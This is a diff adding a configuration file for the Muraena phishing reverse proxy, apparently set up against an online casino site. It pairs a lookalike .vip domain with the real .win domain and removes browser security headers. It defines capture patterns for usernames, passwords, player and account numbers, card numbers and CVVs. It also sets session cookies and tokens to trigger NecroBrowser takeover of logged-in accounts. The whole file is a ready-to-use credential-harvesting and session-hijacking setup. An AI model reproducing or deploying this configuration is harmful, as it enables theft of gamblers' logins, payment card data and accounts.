@@ -1,0 +1,170 @@
+[proxy]
+phishing = "joefortunepokies.vip"
+destination = "joefortunepokies.win"
+IP = "0.0.0.0"
+listener = "0.0.0.0:443"
+
+[proxy.HTTPtoHTTPS]
+enable = true
+HTTPport = 80
+
+[log]
+enable = true
+filePath = "/home/ubuntu/muraena/muraena.log"
+
+[tls]
+enable = true
+expand = false
+certificate = "/etc/letsencrypt/live/joefortunepokies.vip/fullchain.pem"
+key = "/etc/letsencrypt/live/joefortunepokies.vip/privkey.pem"
+root = "/etc/letsencrypt/live/joefortunepokies.vip/fullchain.pem"
+minVersion = "TLS1.2"
+
+[origins]
+externalOriginPrefix = "ext-"
+externalOrigins = [
+    "fonts.googleapis.com",
+    "fonts.gstatic.com",
+    "www.googletagmanager.com",
+    "www.google-analytics.com",
+    "ajax.googleapis.com",
+    "cdnjs.cloudflare.com",
+    "cdn.jsdelivr.net",
+    "static.joefortunepokies.win",
+    "assets.joefortunepokies.win",
+]
+
+[transform.base64]
+enable = false
+
+[transform.request]
+headers = ["Host", "Origin", "Referer"]
+
+[transform.response]
+skipContentType = ["font/*", "image/*"]
+headers = ["Location", "Content-Security-Policy"]
+
+customContent = [
+    ["joefortunepokies.win", "{{.PhishingDomain}}"],
+    ["www.joefortunepokies.win", "www.{{.PhishingDomain}}"],
+    ["play.joefortunepokies.win", "play.{{.PhishingDomain}}"],
+    ["casino.joefortunepokies.win", "casino.{{.PhishingDomain}}"],
+    ["api.joefortunepokies.win", "api.{{.PhishingDomain}}"],
+    ["mobile.joefortunepokies.win", "mobile.{{.PhishingDomain}}"],
+    ["vip.joefortunepokies.win", "vip.{{.PhishingDomain}}"],
+]
+
+[transform.response.remove]
+headers = [
+    "Content-Security-Policy",
+    "X-Content-Type-Options",
+    "X-Frame-Options",
+    "Strict-Transport-Security",
+    "X-XSS-Protection"
+]
+
+[tracking]
+enable = true
+
+[tracking.trace]
+identifier = "_gat"
+validator = "[a-zA-Z0-9]{5}"
+
+[tracking.trace.landing]
+type = "query"
+
+[tracking.secrets]
+paths = ["/login", "/signin", "/auth/login", "/api/auth/login", "/user/login", "/account/login", "/vip/login", "/casino/login", ]
+
+
+[[tracking.secrets.patterns]]
+label = "Username"
+start = "username="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "Email"
+start = "email="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "Password"
+start = "password="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "Player ID"
+start = "playerId="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "Account Number"
+start = "accountNumber="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "Username_JSON"
+start = "\"username\":\""
+end = "\""
+
+[[tracking.secrets.patterns]]
+label = "Email_JSON"
+start = "\"email\":\""
+end = "\""
+
+[[tracking.secrets.patterns]]
+label = "Password_JSON"
+start = "\"password\":\""
+end = "\""
+
+[[tracking.secrets.patterns]]
+label = "PlayerID_JSON"
+start = "\"playerId\":\""
+end = "\""
+
+[[tracking.secrets.patterns]]
+label = "AccountNumber_JSON"
+start = "\"accountNumber\":\""
+end = "\""
+
+[[tracking.secrets.patterns]]
+label = "CreditCard"
+start = "cardNumber="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "CVV"
+start = "cvv="
+end = "&"
+
+[[tracking.secrets.patterns]]
+label = "CardNumber_JSON"
+start = "\"cardNumber\":\""
+end = "\""
+
+[[tracking.secrets.patterns]]
+label = "CVV_JSON"
+start = "\"cvv\":\""
+end = "\""
+
+
+[crawler]
+enable = false
+
+[redis]
+enable = true
+host = "127.0.0.1"
+port = 6379
+
+[necrobrowser]
+enable = true
+endpoint = "http://127.0.0.1:3000/instrument"
+profile = "/home/ubuntu/necrobrowser/config.toml"
+
+[necrobrowser.urls]
+authSession = ["/dashboard", "/account", "/account/profile", "/account/balance", "/casino/lobby", "/vip/dashboard", "/play", "/games", "/deposit", "/withdraw", ]
+
+[necrobrowser.trigger]
+type = "cookie"
+values = ["session", "auth_token", "JSESSIONID", "player_session", "casino_session", "user_token", "access_token", "refresh_token", "player_id", "account_token", "vip_session", "game_session", ]
+delay = 5
